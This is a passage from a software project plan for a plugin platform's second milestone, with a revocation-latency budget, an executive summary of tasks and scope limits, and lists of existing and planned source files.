### 200 ms revoke path (step-by-step timing budget)

| Step | Budget |
|---|---|
| HTTP DELETE arrives at gateway | 0 ms |
| `UpdateConsentPerms` SQL | ≤30 ms (PG local) |
| `bridgeMgr.InvalidateConsent(plugin,cap)` publishes | ≤1 ms |
| Every active Conn's revocation handler flips its dirty-cap flag | ≤5 ms (broadcast) |
| Gate.Check called on next `storage.set` sees dirty flag | ≤1 ms |
| EPERM envelope written to WS | ≤5 ms |
| WS writes traverse to Flutter | ≤20 ms (LAN) |
| Flutter shim rejects promise | ≤5 ms |
| **Total** | **≤67 ms** — well inside 200 ms SLO |

---

## 12. Executive summary (≤200 words)

**Total tasks:** 26 (T1–T25 plus T16b). **Critical path:** 18 sequential hops. **Target calendar:** ≈5 working weeks with one backend engineer + one Flutter engineer operating in parallel after the T1+T3+T5 first-PR seam merges.

**Biggest unknown:** the 200 ms hot-revoke SLO end-to-end. The protocol + manager design in §11 meets it comfortably on paper, but CI on underpowered runners can jitter; mitigation is a hard-coded `time.Now()` deadline in `TestE2E_KanbanFullLifecycle` plus a backup `go test -bench` run on every PR that touches `plugin/bridge/`.

**Suggested first task:** **T1 — Extend ContributesV1 with activityBar/views/panels.** Additive only, zero runtime behaviour change, unblocks validator (T2), registry (T3), compat (T4), reference plugin (T22), and every Flutter DTO. Ship it together with T3 and T5 per §9.

**Non-negotiable boundary:** no `fs.*`/`exec.*`/`http.*`/`session.*`/`secret.*`/`ui.*`/`commands.execute`/`tasks.*`/`clipboard.*`/`llm.*`/`git.*`/`telegram.*`/`logger.*` namespaces; no host sidecar supervisor; no marketplace client; no hot reload. Those are M3/M4/M6. If a task starts drifting toward them, stop and file a DEFERRED entry in §1.

---

## Relevant file paths (all absolute)

**Design contract:**
- `/home/linivek/workspace/opendray/docs/plugin-platform/12-roadmap.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/02-manifest.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/03-contribution-points.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/04-bridge-api.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/05-capabilities.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/07-lifecycle.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/08-workbench-slots.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/10-security.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/M1-PLAN.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/SUMMARY.md`

**Existing code anchors (M1):**
- `/home/linivek/workspace/opendray/plugin/manifest.go`
- `/home/linivek/workspace/opendray/plugin/manifest_validate.go`
- `/home/linivek/workspace/opendray/plugin/bridge/capabilities.go`
- `/home/linivek/workspace/opendray/plugin/contributions/registry.go`
- `/home/linivek/workspace/opendray/plugin/compat/synthesize.go`
- `/home/linivek/workspace/opendray/plugin/commands/dispatcher.go`
- `/home/linivek/workspace/opendray/plugin/install/install.go`
- `/home/linivek/workspace/opendray/plugin/install/consent.go`
- `/home/linivek/workspace/opendray/plugin/hooks.go`
- `/home/linivek/workspace/opendray/plugin/runtime.go`
- `/home/linivek/workspace/opendray/plugin/e2e_test.go`
- `/home/linivek/workspace/opendray/kernel/store/plugin_consents.go`
- `/home/linivek/workspace/opendray/kernel/store/migrations/011_plugin_kv.sql`
- `/home/linivek/workspace/opendray/kernel/store/migrations/012_plugin_secret.sql`
- `/home/linivek/workspace/opendray/gateway/server.go`
- `/home/linivek/workspace/opendray/gateway/plugins_install.go`
- `/home/linivek/workspace/opendray/gateway/plugins_command.go`
- `/home/linivek/workspace/opendray/gateway/workbench.go`
- `/home/linivek/workspace/opendray/gateway/ws.go`
- `/home/linivek/workspace/opendray/app/pubspec.yaml`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/workbench_service.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/workbench_models.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/command_palette.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/status_bar_strip.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/keybindings.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/menu_slot.dart`
- `/home/linivek/workspace/opendray/app/lib/features/dashboard/dashboard_page.dart`
- `/home/linivek/workspace/opendray/app/lib/features/session/session_page.dart`
- `/home/linivek/workspace/opendray/app/lib/core/api/api_client.dart`

**Files to be created (M2):**
- `/home/linivek/workspace/opendray/plugin/bridge/protocol.go`
- `/home/linivek/workspace/opendray/plugin/bridge/protocol_test.go`
- `/home/linivek/workspace/opendray/plugin/bridge/manager.go`
- `/home/linivek/workspace/opendray/plugin/bridge/manager_test.go`
- `/home/linivek/workspace/opendray/plugin/bridge/api_workbench.go`
- `/home/linivek/workspace/opendray/plugin/bridge/api_workbench_test.go`
- `/home/linivek/workspace/opendray/plugin/bridge/api_storage.go`
- `/home/linivek/workspace/opendray/plugin/bridge/api_storage_test.go`
- `/home/linivek/workspace/opendray/plugin/bridge/api_events.go`
- `/home/linivek/workspace/opendray/plugin/bridge/api_events_test.go`
- `/home/linivek/workspace/opendray/kernel/store/plugin_kv.go`
- `/home/linivek/workspace/opendray/kernel/store/plugin_kv_test.go`
- `/home/linivek/workspace/opendray/gateway/plugins_bridge.go`
- `/home/linivek/workspace/opendray/gateway/plugins_bridge_test.go`
- `/home/linivek/workspace/opendray/gateway/plugins_assets.go`
- `/home/linivek/workspace/opendray/gateway/plugins_assets_test.go`
- `/home/linivek/workspace/opendray/gateway/plugins_assets_csp_test.go`
- `/home/linivek/workspace/opendray/gateway/plugins_consents.go`
- `/home/linivek/workspace/opendray/gateway/plugins_consents_test.go`
- `/home/linivek/workspace/opendray/gateway/workbench_stream.go`
- `/home/linivek/workspace/opendray/gateway/workbench_stream_test.go`
- `/home/linivek/workspace/opendray/plugins/examples/kanban/manifest.json`
- `/home/linivek/workspace/opendray/plugins/examples/kanban/README.md`
- `/home/linivek/workspace/opendray/plugins/examples/kanban/ui/index.html`
- `/home/linivek/workspace/opendray/plugins/examples/kanban/ui/main.js`
- `/home/linivek/workspace/opendray/plugins/examples/kanban/ui/styles.css`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/activity_bar.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/view_host.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/panel_slot.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/webview_host.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/webview_host_desktop.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/plugin_bridge_channel.dart`
- `/home/linivek/workspace/opendray/app/lib/features/settings/plugin_consents_page.dart`
